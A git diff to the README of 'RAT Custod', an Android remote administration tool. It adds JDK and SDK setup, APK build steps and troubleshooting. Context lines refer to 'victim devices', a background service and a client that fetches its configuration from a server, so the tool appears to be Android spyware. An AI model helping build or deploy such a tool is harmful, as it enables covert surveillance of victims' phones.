@@ -47,16 +47,72 @@ RAT Custod is a remote administration tool consisting of an Android client and a
 
 ### Client Setup
 
-1. Build the Android APK or use the pre-built APK from the `dist` folder
+#### Prerequisites for Building
 
-2. Install on Android device:
+Before building the Android client, ensure you have:
+
+1. **Java JDK 11** installed (JDK 8 also works, but JDK 11 is recommended)
+   ```bash
+   # Verify Java version
+   java -version
+   # Should show version 11.x or 1.8.x
+   ```
+
+2. **Android SDK** properly installed
+   ```bash
+   # Set environment variables (add to ~/.bashrc or ~/.zshrc)
+   export ANDROID_HOME=/path/to/android/sdk
+   export ANDROID_SDK_ROOT=/path/to/android/sdk
+   ```
+
+3. **Configure local.properties** (create if it doesn't exist)
+   ```bash
+   cd rat-Client
+   echo "sdk.dir=/path/to/android/sdk" > local.properties
+   ```
+
+#### Building the APK
+
+1. Navigate to the client directory:
+   ```bash
+   cd rat-Client
+   ```
+
+2. Ensure you're using the correct JDK:
+   ```bash
+   # Option 1: Set JAVA_HOME environment variable
+   export JAVA_HOME=/path/to/jdk-11
+   
+   # Option 2: Configure in gradle.properties (already configured)
+   # The gradle.properties file already sets org.gradle.java.home
+   ```
+
+3. Build the release APK:
+   
+   **Option A: Using the build script (Recommended)**
+   ```bash
+   ./build-apk.sh
+   ```
+   This script automatically detects and uses JDK 11.
+   
+   **Option B: Manual build with Gradle**
+   ```bash
+   export JAVA_HOME=/path/to/jdk-11
+   ./gradlew assembleRelease
+   ```
+
+4. The built APK will be copied to `../Output/app.apk`
+
+#### Installing the APK
+
+1. Install on Android device:
    ```bash
    adb install path/to/app.apk
    ```
 
-3. Grant required permissions when prompted
+2. Grant required permissions when prompted
 
-4. The client will automatically:
+3. The client will automatically:
    - Fetch configuration from server at `http://<SERVER_IP>:3000/api/config`
    - Connect to the server using the configured IP and port
    - Start background service for remote management
@@ -177,8 +233,10 @@ Returns notification history for a specific victim device.
 
 - Node.js 14+ 
 - Android SDK (for building client)
-- Java JDK 8+
+- **Java JDK 11** (Required - JDK 8 also compatible, JDK 17+ not supported)
 - Gradle 7.0+
+
+**Important**: The Android client build requires JDK 11 or JDK 8. Using JDK 17 or higher will result in build errors due to module encapsulation restrictions with the Android Gradle Plugin version used in this project.
 
 ### Project Structure
 
@@ -227,10 +285,13 @@ rat_custod/
 
 ### APK build fails
 
-1. Verify Android SDK is properly installed
-2. Check Java version compatibility (JDK 8-11 recommended)
-3. Ensure all dependencies are installed
-4. Review Gradle build logs for specific errors
+1. **JDK Version Error**: If you see an error like `Unable to make field private final java.lang.String java.io.File.path accessible`, you're using an incompatible JDK version.
+   - **Solution**: Use JDK 11 or JDK 8. Set `JAVA_HOME` environment variable or configure `org.gradle.java.home` in `rat-Client/gradle.properties`
+   - Example: `export JAVA_HOME=/path/to/jdk-11` or add to gradle.properties: `org.gradle.java.home=/path/to/jdk-11`
+2. Verify Android SDK is properly installed and `ANDROID_HOME` or `ANDROID_SDK_ROOT` is set
+3. Check that `rat-Client/local.properties` points to the correct SDK location
+4. Ensure all dependencies are installed
+5. Review Gradle build logs for specific errors: `./gradlew assembleRelease --stacktrace --info`
 
 ## License
 
